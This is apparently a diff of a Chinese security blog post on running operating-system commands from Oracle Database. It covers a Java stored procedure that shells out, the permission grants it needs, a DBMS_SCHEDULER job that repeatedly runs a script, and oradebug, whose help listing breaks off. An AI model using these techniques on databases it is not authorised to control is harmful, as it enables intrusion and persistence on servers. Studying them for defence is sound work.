@@ -21,12 +21,12 @@
   <meta name="author" content="henices">
   <meta name="keywords" content="">
   
-    <meta name="description" content="1. 正统方法1.1 使用JAVA1.1.1 代码Oracle 数据库都支持Java，可以利用java来实现我们需要的功能。 123456789101112131415161718192021222324252627282930313233343536373839404142434445CREATE OR REPLACE AND RESOLVE JAVA SOURCE NAMED &quot;JA">
+    <meta name="description" content="1. 正统方法1.1 使用JAVA1.1.1 代码Oracle 数据库都支持Java，可以利用java来实现我们需要的功能。 CREATE OR REPLACE AND RESOLVE JAVA SOURCE NAMED &quot;JAVACMD&quot; AS import java.lang.*; import java.io.*;  public class JAVACMD &#123;">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Execute os command in Oracle Database">
 <meta property="og:url" content="https://usmacd.com/cn/oracle_run_os_cmd/index.html">
 <meta property="og:site_name" content="安全代码">
-<meta property="og:description" content="1. 正统方法1.1 使用JAVA1.1.1 代码Oracle 数据库都支持Java，可以利用java来实现我们需要的功能。 123456789101112131415161718192021222324252627282930313233343536373839404142434445CREATE OR REPLACE AND RESOLVE JAVA SOURCE NAMED &quot;JA">
+<meta property="og:description" content="1. 正统方法1.1 使用JAVA1.1.1 代码Oracle 数据库都支持Java，可以利用java来实现我们需要的功能。 CREATE OR REPLACE AND RESOLVE JAVA SOURCE NAMED &quot;JAVACMD&quot; AS import java.lang.*; import java.io.*;  public class JAVACMD &#123;">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2023-09-06T03:00:51.727Z">
 <meta property="article:modified_time" content="2023-09-06T03:00:51.727Z">
@@ -352,26 +352,78 @@
               <div class="markdown-body">
                 
                 <h2 id="1-正统方法"><a href="#1-正统方法" class="headerlink" title="1. 正统方法"></a>1. 正统方法</h2><h3 id="1-1-使用JAVA"><a href="#1-1-使用JAVA" class="headerlink" title="1.1 使用JAVA"></a>1.1 使用JAVA</h3><h4 id="1-1-1-代码"><a href="#1-1-1-代码" class="headerlink" title="1.1.1 代码"></a>1.1.1 代码</h4><p>Oracle 数据库都支持Java，可以利用java来实现我们需要的功能。</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs java">CREATE OR REPLACE AND RESOLVE JAVA SOURCE NAMED <span class="hljs-string">&quot;JAVACMD&quot;</span> AS<br><span class="hljs-keyword">import</span> java.lang.*;<br><span class="hljs-keyword">import</span> java.io.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JAVACMD</span><br>&#123;<br> <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">execCommand</span> <span class="hljs-params">(String command)</span> <span class="hljs-keyword">throws</span> IOException<br> &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        String[] finalCommand;<br>        <span class="hljs-keyword">if</span> (System.getProperty(<span class="hljs-string">&quot;os.name&quot;</span>).toLowerCase().indexOf(<span class="hljs-string">&quot;windows&quot;</span>) != -<span class="hljs-number">1</span>) &#123;<br>            finalCommand = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[<span class="hljs-number">4</span>];<br>            finalCommand[<span class="hljs-number">0</span>] = <span class="hljs-string">&quot;C:\\windows\\system32\\cmd.exe&quot;</span>;<br>            finalCommand[<span class="hljs-number">1</span>] = <span class="hljs-string">&quot;/y&quot;</span>;<br>            finalCommand[<span class="hljs-number">2</span>] = <span class="hljs-string">&quot;/c&quot;</span>;<br>            finalCommand[<span class="hljs-number">3</span>] = command;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            finalCommand = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[<span class="hljs-number">3</span>];<br>            finalCommand[<span class="hljs-number">0</span>] = <span class="hljs-string">&quot;/bin/sh&quot;</span>;<br>            finalCommand[<span class="hljs-number">1</span>] = <span class="hljs-string">&quot;-c&quot;</span>;<br>            finalCommand[<span class="hljs-number">2</span>] = command;<br>        &#125;<br>        <span class="hljs-type">Process</span> <span class="hljs-variable">p</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(finalCommand);<br>        <span class="hljs-keyword">if</span> (p.waitFor() != <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">if</span> (p.exitValue() == <span class="hljs-number">1</span>)<br>               System.err.println(<span class="hljs-string">&quot;command execute failed.&quot;</span>);<br>        &#125;<br>        <span class="hljs-type">BufferedInputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedInputStream</span>(p.getInputStream());<br>        <span class="hljs-type">BufferedReader</span> <span class="hljs-variable">inBr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(in));<br>        String lineStr;<br>        <span class="hljs-keyword">while</span> ((lineStr = inBr.readLine()) != <span class="hljs-literal">null</span>)<br>            System.out.println(lineStr);<br>        inBr.close();<br>        in.close();<br>    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        e.printStackTrace();<br>    &#125; <br> &#125;<br>&#125;;<br>/<br><br>CREATE OR REPLACE PROCEDURE <span class="hljs-title function_">JAVACMDPROC</span> <span class="hljs-params">(p_command IN VARCHAR2)</span><br>AS LANGUAGE JAVA<br>NAME <span class="hljs-string">&#x27;JAVACMD.execCommand (java.lang.String)&#x27;</span>;<br>/<br></code></pre></td></tr></table></figure>
+<div class="code-wrapper"><pre><code class="hljs java">CREATE OR REPLACE AND RESOLVE JAVA SOURCE NAMED <span class="hljs-string">&quot;JAVACMD&quot;</span> AS
+<span class="hljs-keyword">import</span> java.lang.*;
+<span class="hljs-keyword">import</span> java.io.*;
 
-<h4 id="1-1-2-设置输出"><a href="#1-1-2-设置输出" class="headerlink" title="1.1.2 设置输出"></a>1.1.2 设置输出</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">set</span> serveroutput <span class="hljs-keyword">on</span> size <span class="hljs-number">100000</span>;<br><span class="hljs-keyword">exec</span> dbms_java.set_output(<span class="hljs-number">100000</span>);<br></code></pre></td></tr></table></figure>
+<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JAVACMD</span>
+&#123;
+ <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">execCommand</span> <span class="hljs-params">(String command)</span> <span class="hljs-keyword">throws</span> IOException
+ &#123;
+    <span class="hljs-keyword">try</span> &#123;
+        String[] finalCommand;
+        <span class="hljs-keyword">if</span> (System.getProperty(<span class="hljs-string">&quot;os.name&quot;</span>).toLowerCase().indexOf(<span class="hljs-string">&quot;windows&quot;</span>) != -<span class="hljs-number">1</span>) &#123;
+            finalCommand = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[<span class="hljs-number">4</span>];
+            finalCommand[<span class="hljs-number">0</span>] = <span class="hljs-string">&quot;C:\\windows\\system32\\cmd.exe&quot;</span>;
+            finalCommand[<span class="hljs-number">1</span>] = <span class="hljs-string">&quot;/y&quot;</span>;
+            finalCommand[<span class="hljs-number">2</span>] = <span class="hljs-string">&quot;/c&quot;</span>;
+            finalCommand[<span class="hljs-number">3</span>] = command;
+        &#125; <span class="hljs-keyword">else</span> &#123;
+            finalCommand = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[<span class="hljs-number">3</span>];
+            finalCommand[<span class="hljs-number">0</span>] = <span class="hljs-string">&quot;/bin/sh&quot;</span>;
+            finalCommand[<span class="hljs-number">1</span>] = <span class="hljs-string">&quot;-c&quot;</span>;
+            finalCommand[<span class="hljs-number">2</span>] = command;
+        &#125;
+        <span class="hljs-type">Process</span> <span class="hljs-variable">p</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(finalCommand);
+        <span class="hljs-keyword">if</span> (p.waitFor() != <span class="hljs-number">0</span>) &#123;
+            <span class="hljs-keyword">if</span> (p.exitValue() == <span class="hljs-number">1</span>)
+               System.err.println(<span class="hljs-string">&quot;command execute failed.&quot;</span>);
+        &#125;
+        <span class="hljs-type">BufferedInputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedInputStream</span>(p.getInputStream());
+        <span class="hljs-type">BufferedReader</span> <span class="hljs-variable">inBr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(in));
+        String lineStr;
+        <span class="hljs-keyword">while</span> ((lineStr = inBr.readLine()) != <span class="hljs-literal">null</span>)
+            System.out.println(lineStr);
+        inBr.close();
+        in.close();
+    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;
+        e.printStackTrace();
+    &#125; 
+ &#125;
+&#125;;
+/
+
+CREATE OR REPLACE PROCEDURE <span class="hljs-title function_">JAVACMDPROC</span> <span class="hljs-params">(p_command IN VARCHAR2)</span>
+AS LANGUAGE JAVA
+NAME <span class="hljs-string">&#x27;JAVACMD.execCommand (java.lang.String)&#x27;</span>;
+/</code></pre></div>
+
+<h4 id="1-1-2-设置输出"><a href="#1-1-2-设置输出" class="headerlink" title="1.1.2 设置输出"></a>1.1.2 设置输出</h4><div class="code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">set</span> serveroutput <span class="hljs-keyword">on</span> size <span class="hljs-number">100000</span>;
+<span class="hljs-keyword">exec</span> dbms_java.set_output(<span class="hljs-number">100000</span>);</code></pre></div>
 
 <h4 id="1-1-3-需要的权限"><a href="#1-1-3-需要的权限" class="headerlink" title="1.1.3 需要的权限"></a>1.1.3 需要的权限</h4><p>可以使用下面的语句查询相关权限</p>
 <ul>
 <li>用户权限</li>
 </ul>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> session_privs;<br></code></pre></td></tr></table></figure>
+<div class="code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> session_privs;</code></pre></div>
 
 <ul>
 <li>JAVA 权限</li>
 </ul>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> dba_java_policy;<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> user_java_policy;<br></code></pre></td></tr></table></figure>
+<div class="code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> dba_java_policy;
+<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> user_java_policy;</code></pre></div>
 
 <p>使用java代码执行系统命令需要的权限，可以使用下面语句进行授权：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">exec</span> dbms_java.grant_permission(<span class="hljs-string">&#x27;SCOTT&#x27;</span>, <span class="hljs-string">&#x27;SYS:java.io.FilePermission&#x27;</span>,<span class="hljs-string">&#x27;&lt;&lt;ALL FILES&gt;&gt;&#x27;</span>,<span class="hljs-string">&#x27;execute&#x27;</span>);<br><span class="hljs-keyword">exec</span> dbms_java.grant_permission(<span class="hljs-string">&#x27;SCOTT&#x27;</span>,<span class="hljs-string">&#x27;SYS:java.lang.RuntimePermission&#x27;</span>, <span class="hljs-string">&#x27;writeFileDescriptor&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>);<br><span class="hljs-keyword">exec</span> dbms_java.grant_permission(<span class="hljs-string">&#x27;SCOTT&#x27;</span>,<span class="hljs-string">&#x27;SYS:java.lang.RuntimePermission&#x27;</span>, <span class="hljs-string">&#x27;readFileDescriptor&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>);<br></code></pre></td></tr></table></figure>
+<div class="code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">exec</span> dbms_java.grant_permission(<span class="hljs-string">&#x27;SCOTT&#x27;</span>, <span class="hljs-string">&#x27;SYS:java.io.FilePermission&#x27;</span>,<span class="hljs-string">&#x27;&lt;&lt;ALL FILES&gt;&gt;&#x27;</span>,<span class="hljs-string">&#x27;execute&#x27;</span>);
+<span class="hljs-keyword">exec</span> dbms_java.grant_permission(<span class="hljs-string">&#x27;SCOTT&#x27;</span>,<span class="hljs-string">&#x27;SYS:java.lang.RuntimePermission&#x27;</span>, <span class="hljs-string">&#x27;writeFileDescriptor&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>);
+<span class="hljs-keyword">exec</span> dbms_java.grant_permission(<span class="hljs-string">&#x27;SCOTT&#x27;</span>,<span class="hljs-string">&#x27;SYS:java.lang.RuntimePermission&#x27;</span>, <span class="hljs-string">&#x27;readFileDescriptor&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>);</code></pre></div>
 
 <h4 id="1-1-4-实验结果"><a href="#1-1-4-实验结果" class="headerlink" title="1.1.4 实验结果"></a>1.1.4 实验结果</h4><p>非常不错支持回显。</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SQL</span><span class="hljs-operator">&gt;</span> <span class="hljs-keyword">exec</span> javacmdproc(<span class="hljs-string">&#x27;/bin/uname -a&#x27;</span>);<br>Linux localhost.localdomain <span class="hljs-number">2.6</span><span class="hljs-number">.32</span><span class="hljs-number">-100.34</span><span class="hljs-number">.1</span>.el6uek.i686 #<span class="hljs-number">1</span> SMP Wed May <span class="hljs-number">25</span><br><span class="hljs-number">17</span>:<span class="hljs-number">28</span>:<span class="hljs-number">36</span> EDT <span class="hljs-number">2011</span> i686 i686 i386 GNU<span class="hljs-operator">/</span>Linux<br><br>PL<span class="hljs-operator">/</span><span class="hljs-keyword">SQL</span> <span class="hljs-keyword">procedure</span> successfully completed.<br></code></pre></td></tr></table></figure>
+<div class="code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SQL</span><span class="hljs-operator">&gt;</span> <span class="hljs-keyword">exec</span> javacmdproc(<span class="hljs-string">&#x27;/bin/uname -a&#x27;</span>);
+Linux localhost.localdomain <span class="hljs-number">2.6</span><span class="hljs-number">.32</span><span class="hljs-number">-100.34</span><span class="hljs-number">.1</span>.el6uek.i686 #<span class="hljs-number">1</span> SMP Wed May <span class="hljs-number">25</span>
+<span class="hljs-number">17</span>:<span class="hljs-number">28</span>:<span class="hljs-number">36</span> EDT <span class="hljs-number">2011</span> i686 i686 i386 GNU<span class="hljs-operator">/</span>Linux
+
+PL<span class="hljs-operator">/</span><span class="hljs-keyword">SQL</span> <span class="hljs-keyword">procedure</span> successfully completed.</code></pre></div>
 
 <h4 id="1-1-5-注意"><a href="#1-1-5-注意" class="headerlink" title="1.1.5 注意"></a>1.1.5 注意</h4><p>需要使用全路径</p>
 <h3 id="1-2-DBMS-SCHEDULAR"><a href="#1-2-DBMS-SCHEDULAR" class="headerlink" title="1.2 DBMS_SCHEDULAR"></a>1.2 DBMS_SCHEDULAR</h3><h4 id="1-2-1-DBMS-SCHEDULAR-简介"><a href="#1-2-1-DBMS-SCHEDULAR-简介" class="headerlink" title="1.2.1 DBMS_SCHEDULAR 简介"></a>1.2.1 DBMS_SCHEDULAR 简介</h4><p>这个和Windows上的计划任务类似。</p>
@@ -381,7 +433,29 @@
 <li>EXECUTE on dbms_scheduler (granted to public by default)</li>
 </ol>
 <p><code>grant create job, create external job to scott ;</code></p>
-<h4 id="1-2-3-执行的语句"><a href="#1-2-3-执行的语句" class="headerlink" title="1.2.3 执行的语句"></a>1.2.3 执行的语句</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java">BEGIN<br>DBMS_SCHEDULER.CREATE_PROGRAM (<br>program_name=&gt; <span class="hljs-string">&#x27;MyCmd&#x27;</span>,<br>program_type=&gt; <span class="hljs-string">&#x27;EXECUTABLE&#x27;</span>,<br>-- Use the ampersand to <span class="hljs-keyword">break</span> <span class="hljs-type">out</span><br><span class="hljs-variable">program_action</span> <span class="hljs-operator">=</span>&gt; <span class="hljs-string">&#x27;/tmp/a.sh&#x27;</span>,<br>enabled=&gt; TRUE,<br>comments=&gt; <span class="hljs-string">&#x27;Run a command using shell metacharacters.&#x27;</span><br> );<br>END;<br>/<br><br>BEGIN<br>DBMS_SCHEDULER.CREATE_JOB (<br>   job_name=&gt; <span class="hljs-string">&#x27;X&#x27;</span>,<br>   program_name=&gt; <span class="hljs-string">&#x27;MyCmd&#x27;</span>,<br>   repeat_interval=&gt; <span class="hljs-string">&#x27;FREQ=SECONDLY;INTERVAL=10&#x27;</span>,<br>   enabled=&gt; TRUE,<br>   comments=&gt; <span class="hljs-string">&#x27;Every 10 seconds&#x27;</span>);<br>END;<br>/<br><br>exec DBMS_SCHEDULER.RUN_JOB ( job_name=&gt; <span class="hljs-string">&#x27;X&#x27;</span>);<br></code></pre></td></tr></table></figure>
+<h4 id="1-2-3-执行的语句"><a href="#1-2-3-执行的语句" class="headerlink" title="1.2.3 执行的语句"></a>1.2.3 执行的语句</h4><div class="code-wrapper"><pre><code class="hljs java">BEGIN
+DBMS_SCHEDULER.CREATE_PROGRAM (
+program_name=&gt; <span class="hljs-string">&#x27;MyCmd&#x27;</span>,
+program_type=&gt; <span class="hljs-string">&#x27;EXECUTABLE&#x27;</span>,
+-- Use the ampersand to <span class="hljs-keyword">break</span> <span class="hljs-type">out</span>
+<span class="hljs-variable">program_action</span> <span class="hljs-operator">=</span>&gt; <span class="hljs-string">&#x27;/tmp/a.sh&#x27;</span>,
+enabled=&gt; TRUE,
+comments=&gt; <span class="hljs-string">&#x27;Run a command using shell metacharacters.&#x27;</span>
+ );
+END;
+/
+
+BEGIN
+DBMS_SCHEDULER.CREATE_JOB (
+   job_name=&gt; <span class="hljs-string">&#x27;X&#x27;</span>,
+   program_name=&gt; <span class="hljs-string">&#x27;MyCmd&#x27;</span>,
+   repeat_interval=&gt; <span class="hljs-string">&#x27;FREQ=SECONDLY;INTERVAL=10&#x27;</span>,
+   enabled=&gt; TRUE,
+   comments=&gt; <span class="hljs-string">&#x27;Every 10 seconds&#x27;</span>);
+END;
+/
+
+exec DBMS_SCHEDULER.RUN_JOB ( job_name=&gt; <span class="hljs-string">&#x27;X&#x27;</span>);</code></pre></div>
 
 <h4 id="1-2-4-注意"><a href="#1-2-4-注意" class="headerlink" title="1.2.4 注意"></a>1.2.4 注意</h4><ol>
 <li>原先使用 || 等 metacharacters 的bug已经修复，只能使用参数</li>
@@ -393,7 +467,54 @@
 <h3 id="1-3-使用oradebug"><a href="#1-3-使用oradebug" class="headerlink" title="1.3 使用oradebug"></a>1.3 使用oradebug</h3><ul>
 <li>oradebug 简介<br>oradebug是一个神奇的命令, 能干很多活, 但是Oracle却很少提及，属于undocumented<br>状态，是给oracle的工程师使用的，主要用于调试和性能调优。可以使用 oradebug help<br>命令，查看oradebug的用法</li>
 </ul>
-<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs routeros">SQL&gt; oradebug help<br>HELP           [command]                 Describe one <span class="hljs-keyword">or</span> all commands<br>SETMYPID                                 <span class="hljs-built_in">Debug</span> current process<br>SETOSPID       &lt;ospid&gt;                   <span class="hljs-built_in">Set</span> OS pid of process <span class="hljs-keyword">to</span> <span class="hljs-built_in">debug</span><br>SETORAPID      &lt;orapid&gt; [<span class="hljs-string">&#x27;force&#x27;</span>]        <span class="hljs-built_in">Set</span> Oracle pid of process <span class="hljs-keyword">to</span> <span class="hljs-built_in">debug</span><br>SETORAPNAME    &lt;orapname&gt;                <span class="hljs-built_in">Set</span> Oracle process name <span class="hljs-keyword">to</span> <span class="hljs-built_in">debug</span><br>SHORT_STACK                              <span class="hljs-built_in">Get</span> abridged OS stack<br>CURRENT_SQL                              <span class="hljs-built_in">Get</span> current SQL<br>DUMP           &lt;dump_name&gt; &lt;lvl&gt; [addr]  Invoke named dump<br>DUMPSGA        [bytes]                   Dump fixed SGA<br>DUMPLIST                                 <span class="hljs-built_in">Print</span> a list of available dumps<br>EVENT          &lt;text&gt;                    <span class="hljs-built_in">Set</span> trace event <span class="hljs-keyword">in</span> process<br>SESSION_EVENT  &lt;text&gt;                    <span class="hljs-built_in">Set</span> trace event <span class="hljs-keyword">in</span> session<br>DUMPVAR        &lt;p|s|uga&gt; &lt;name&gt; [level]  Print/dump a fixed PGA/SGA/UGA variable<br>DUMPTYPE       &lt;address&gt; &lt;type&gt; &lt;count&gt;  Print/dump an<span class="hljs-built_in"> address </span>with<span class="hljs-built_in"> type </span><span class="hljs-built_in">info</span><br>SETVAR         &lt;p|s|uga&gt; &lt;name&gt; &lt;value&gt;  Modify a fixed PGA/SGA/UGA variable<br>PEEK           &lt;addr&gt; &lt;len&gt; [level]      Print/Dump memory<br>POKE           &lt;addr&gt; &lt;len&gt; &lt;value&gt;      Modify memory<br>WAKEUP         &lt;orapid&gt;                  Wake up Oracle process<br>SUSPEND                                  Suspend execution<br>RESUME                                   Resume execution<br>FLUSH                                    Flush pending writes <span class="hljs-keyword">to</span> trace file<br>CLOSE_TRACE                              Close trace file<br>TRACEFILE_NAME                           <span class="hljs-built_in">Get</span> name of trace file<br>LKDEBUG                                  Invoke global enqueue<span class="hljs-built_in"> service </span>debugger<br>NSDBX                                    Invoke CGS name-service debugger<br>-G             &lt;Inst-List | def | all&gt;   Parallel oradebug command<span class="hljs-built_in"> prefix</span><br><span class="hljs-built_in"></span>-R             &lt;Inst-List | def | all&gt;   Parallel oradebug<span class="hljs-built_in"> prefix </span>(return output<br>SETINST        &lt;instance# <span class="hljs-built_in">..</span> | all&gt;      <span class="hljs-built_in">Set</span><span class="hljs-built_in"> instance </span>list <span class="hljs-keyword">in</span> double quotes<br>SGATOFILE      &lt;SGA dump dir&gt;         Dump SGA <span class="hljs-keyword">to</span> file; dirname <span class="hljs-keyword">in</span> double quotes<br>DMPCOWSGA      &lt;SGA dump dir&gt; Dump &amp; map SGA as COW; dirname <span class="hljs-keyword">in</span> double quotes<br>MAPCOWSGA      &lt;SGA dump dir&gt;         Map SGA as COW; dirname <span class="hljs-keyword">in</span> double quotes<br>HANGANALYZE    [level] [syslevel]        Analyze<span class="hljs-built_in"> system </span>hang<br>FFBEGIN                                  Flash Freeze the<span class="hljs-built_in"> Instance</span><br><span class="hljs-built_in"></span>FFDEREGISTER                             FF deregister<span class="hljs-built_in"> instance </span><span class="hljs-keyword">from</span> cluster<br>FFTERMINST                               Call exit <span class="hljs-keyword">and</span> terminate<span class="hljs-built_in"> instance</span><br><span class="hljs-built_in"></span>FFRESUMEINST                             Resume the flash frozen<span class="hljs-built_in"> instance</span><br><span class="hljs-built_in"></span>FFSTATUS                                 Flash freeze status of<span class="hljs-built_in"> instance</span><br><span class="hljs-built_in"></span>SKDSTTPCS      &lt;ifname&gt;  &lt;ofname&gt;        Helps translate PCs <span class="hljs-keyword">to</span> names<br>WATCH          &lt;address&gt; &lt;len&gt; &lt;self|exist|all|target&gt;  Watch a region of memory<br>DELETE         &lt;local|global|target&gt; watchpoint &lt;id&gt;    Delete a watchpoint<br>SHOW           &lt;local|global|target&gt; watchpoints        Show  watchpoints<br>DIRECT_ACCESS  &lt;set/enable/<span class="hljs-built_in">disable</span> command | select query&gt; Fixed table access<br>CORE                                     Dump core without crashing process<br>IPC                                      Dump ipc information<br>UNLIMIT                                  Unlimit the size of the trace file<br>PROCSTAT                                 Dump process statistics<br>CALL           [-t count] &lt;func&gt; [arg1]<span class="hljs-built_in">..</span>.[argn]  Invoke function with arguments<br></code></pre></td></tr></table></figure>
+<div class="code-wrapper"><pre><code class="hljs routeros">SQL&gt; oradebug help
+HELP           [command]                 Describe one <span class="hljs-keyword">or</span> all commands
+SETMYPID                                 <span class="hljs-built_in">Debug</span> current process
+SETOSPID       &lt;ospid&gt;                   <span class="hljs-built_in">Set</span> OS pid of process <span class="hljs-keyword">to</span> <span class="hljs-built_in">debug</span>
+SETORAPID      &lt;orapid&gt; [<span class="hljs-string">&#x27;force&#x27;</span>]        <span class="hljs-built_in">Set</span> Oracle pid of process <span class="hljs-keyword">to</span> <span class="hljs-built_in">debug</span>
+SETORAPNAME    &lt;orapname&gt;                <span class="hljs-built_in">Set</span> Oracle process name <span class="hljs-keyword">to</span> <span class="hljs-built_in">debug</span>
+SHORT_STACK                              <span class="hljs-built_in">Get</span> abridged OS stack
+CURRENT_SQL                              <span class="hljs-built_in">Get</span> current SQL
+DUMP           &lt;dump_name&gt; &lt;lvl&gt; [addr]  Invoke named dump
+DUMPSGA        [bytes]                   Dump fixed SGA
+DUMPLIST                                 <span class="hljs-built_in">Print</span> a list of available dumps
+EVENT          &lt;text&gt;                    <span class="hljs-built_in">Set</span> trace event <span class="hljs-keyword">in</span> process
+SESSION_EVENT  &lt;text&gt;                    <span class="hljs-built_in">Set</span> trace event <span class="hljs-keyword">in</span> session
+DUMPVAR        &lt;p|s|uga&gt; &lt;name&gt; [level]  Print/dump a fixed PGA/SGA/UGA variable
+DUMPTYPE       &lt;address&gt; &lt;type&gt; &lt;count&gt;  Print/dump an<span class="hljs-built_in"> address </span>with<span class="hljs-built_in"> type </span><span class="hljs-built_in">info</span>
+SETVAR         &lt;p|s|uga&gt; &lt;name&gt; &lt;value&gt;  Modify a fixed PGA/SGA/UGA variable
+PEEK           &lt;addr&gt; &lt;len&gt; [level]      Print/Dump memory
+POKE           &lt;addr&gt; &lt;len&gt; &lt;value&gt;      Modify memory
+WAKEUP         &lt;orapid&gt;                  Wake up Oracle process
+SUSPEND                                  Suspend execution
+RESUME                                   Resume execution
+FLUSH                                    Flush pending writes <span class="hljs-keyword">to</span> trace file
+CLOSE_TRACE                              Close trace file
+TRACEFILE_NAME                           <span class="hljs-built_in">Get</span> name of trace file
+LKDEBUG                                  Invoke global enqueue<span class="hljs-built_in"> service </span>debugger
+NSDBX                                    Invoke CGS name-service debugger
+-G             &lt;Inst-List | def | all&gt;   Parallel oradebug command<span class="hljs-built_in"> prefix</span>
+<span class="hljs-built_in"></span>-R             &lt;Inst-List | def | all&gt;   Parallel oradebug<span class="hljs-built_in"> prefix </span>(return output
+SETINST        &lt;instance# <span class="hljs-built_in">..</span> | all&gt;      <span class="hljs-built_in">Set</span><span class="hljs-built_in"> instance </span>list <span class="hljs-keyword">in</span> double quotes
+SGATOFILE      &lt;SGA dump dir&gt;         Dump SGA <span class="hljs-keyword">to</span> file; dirname <span class="hljs-keyword">in</span> double quotes
